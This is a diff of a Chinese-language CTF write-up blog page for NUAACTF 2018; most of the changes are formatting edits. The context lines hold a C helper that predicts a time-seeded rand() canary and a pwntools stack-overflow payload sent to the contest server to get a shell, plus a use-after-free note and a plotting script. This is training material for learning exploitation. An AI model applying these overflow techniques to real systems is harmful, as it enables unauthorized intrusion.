@@ -119,18 +119,18 @@
 
 
 
-  <meta name="description" content="overflow 程序逻辑很简单,一个栈溢出,但是有一个类似canary的检测,用的检测值是C语言的rand()生成,不过这个是伪随机数,通过srand()设置随机数种子. 这里用的随机数种子是time(0),在C语言中可以通过time()函数获取到当前的秒数,参数为0则函数返回值即为结果,若参数不为0则结果保存在参数中. 所以只要同一秒作为种子生成rand()就可以获得检测值. 1.c">
+  <meta name="description" content="overflow 程序逻辑很简单,一个栈溢出,但是有一个类似canary的检测,用的检测值是C语言的rand()生成,不过这个是伪随机数,通过srand()设置随机数种子. 这里用的随机数种子是time(0),在C语言中可以通过time()函数获取到当前的秒数,参数为0则函数返回值即为结果,若参数不为0则结果保存在参数中.所以只要同一秒作为种子生成rand()就可以获得检测值. 123456">
 <meta name="keywords" content="Jeopardy">
 <meta property="og:type" content="article">
 <meta property="og:title" content="writeup-nuaactf-2018">
 <meta property="og:url" content="https://hitworld.github.io/posts/4721d192/index.html">
 <meta property="og:site_name" content="w4rd3n">
-<meta property="og:description" content="overflow 程序逻辑很简单,一个栈溢出,但是有一个类似canary的检测,用的检测值是C语言的rand()生成,不过这个是伪随机数,通过srand()设置随机数种子. 这里用的随机数种子是time(0),在C语言中可以通过time()函数获取到当前的秒数,参数为0则函数返回值即为结果,若参数不为0则结果保存在参数中. 所以只要同一秒作为种子生成rand()就可以获得检测值. 1.c">
+<meta property="og:description" content="overflow 程序逻辑很简单,一个栈溢出,但是有一个类似canary的检测,用的检测值是C语言的rand()生成,不过这个是伪随机数,通过srand()设置随机数种子. 这里用的随机数种子是time(0),在C语言中可以通过time()函数获取到当前的秒数,参数为0则函数返回值即为结果,若参数不为0则结果保存在参数中.所以只要同一秒作为种子生成rand()就可以获得检测值. 123456">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2020-08-25T11:40:29.678Z">
+<meta property="og:updated_time" content="2020-08-26T05:47:17.015Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="writeup-nuaactf-2018">
-<meta name="twitter:description" content="overflow 程序逻辑很简单,一个栈溢出,但是有一个类似canary的检测,用的检测值是C语言的rand()生成,不过这个是伪随机数,通过srand()设置随机数种子. 这里用的随机数种子是time(0),在C语言中可以通过time()函数获取到当前的秒数,参数为0则函数返回值即为结果,若参数不为0则结果保存在参数中. 所以只要同一秒作为种子生成rand()就可以获得检测值. 1.c">
+<meta name="twitter:description" content="overflow 程序逻辑很简单,一个栈溢出,但是有一个类似canary的检测,用的检测值是C语言的rand()生成,不过这个是伪随机数,通过srand()设置随机数种子. 这里用的随机数种子是time(0),在C语言中可以通过time()函数获取到当前的秒数,参数为0则函数返回值即为结果,若参数不为0则结果保存在参数中.所以只要同一秒作为种子生成rand()就可以获得检测值. 123456">
 
 
 
@@ -532,10 +532,8 @@
       
         <h2 id="overflow">overflow</h2>
 <p>程序逻辑很简单,一个栈溢出,但是有一个类似<code>canary</code>的检测,用的检测值是<code>C</code>语言的<code>rand()</code>生成,不过这个是伪随机数,通过<code>srand()</code>设置随机数种子.</p>
-<p>这里用的随机数种子是<code>time(0)</code>,在<code>C</code>语言中可以通过<code>time()</code>函数获取到当前的秒数,参数为<code>0</code>则函数返回值即为结果,若参数不为<code>0</code>则结果保存在参数中.</p>
-<p>所以只要同一秒作为种子生成<code>rand()</code>就可以获得检测值.</p>
-<p><code>1.c</code></p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    srand(time(<span class="number">0</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p"</span>,rand());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里用的随机数种子是<code>time(0)</code>,在<code>C</code>语言中可以通过<code>time()</code>函数获取到当前的秒数,参数为<code>0</code>则函数返回值即为结果,若参数不为<code>0</code>则结果保存在参数中.所以只要同一秒作为种子生成<code>rand()</code>就可以获得检测值.</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    srand(time(<span class="number">0</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p"</span>,rand());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p><code>payload</code></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">s = process(<span class="string">"./1"</span>)</span><br><span class="line"><span class="comment">#r = process("./overflow")</span></span><br><span class="line">r = remote(<span class="string">"ctf.asuri.org"</span>,<span class="string">"20001"</span>)</span><br><span class="line">mi = s.recv()</span><br><span class="line">mi = int(mi,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(mi)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x20</span> * <span class="string">'a'</span> + p32(mi) + p32(<span class="number">0x80485BD</span>) * <span class="number">4</span></span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 <h2 id="password_checker">password_checker</h2>
@@ -545,7 +543,7 @@
 <p>程序逻辑里会<code>see</code>调用<code>class</code>的第一个指针,<code>c1</code>的是打印字符串,<code>o2</code>的就是<code>system("sh")</code>.</p>
 <p>所以只要<code>free</code>一个<code>c1</code>然后用<code>100</code>分配一个<code>o2</code>,<code>see</code>一下获得<code>shell</code></p>
 <h2 id="middle">middle</h2>
-<p>逆向处理字符的汇编代码获得处理过程,通过宏获得异或值,打表对应<code>check</code>值获得<code>flag</code></p>
+<p>逆向处理字符的汇编代码获得处理过程,通过宏获得异或值,打表对应<code>check</code>值获得<code>flag</code>.</p>
 <h2 id="plot">plot</h2>
 <p>绘图获得<code>flag</code>.</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">"plot.txt"</span>)</span><br><span class="line">x = [<span class="number">0</span>]</span><br><span class="line">y = [<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1044</span>):</span><br><span class="line">    line = f.readline()</span><br><span class="line">    list1 = line.split(<span class="string">"  "</span>, <span class="number">1</span>)</span><br><span class="line">    x.append(float(list1[<span class="number">0</span>]))</span><br><span class="line">    y.append(float(list1[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">plt.plot(x, y)  </span><br><span class="line">f.close()</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
@@ -674,7 +672,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">172</span>
+                    <span class="site-state-item-count">171</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -898,7 +896,7 @@
       <i class="fa fa-area-chart"></i>
     </span>
     
-    <span title="站点总字数">727k</span>
+    <span title="站点总字数">705k</span>
   
 
   
@@ -907,7 +905,7 @@
       <i class="fa fa-coffee"></i>
     </span>
     
-    <span title="站点阅读时长">11:01</span>
+    <span title="站点阅读时长">10:41</span>
   
 </div>
 
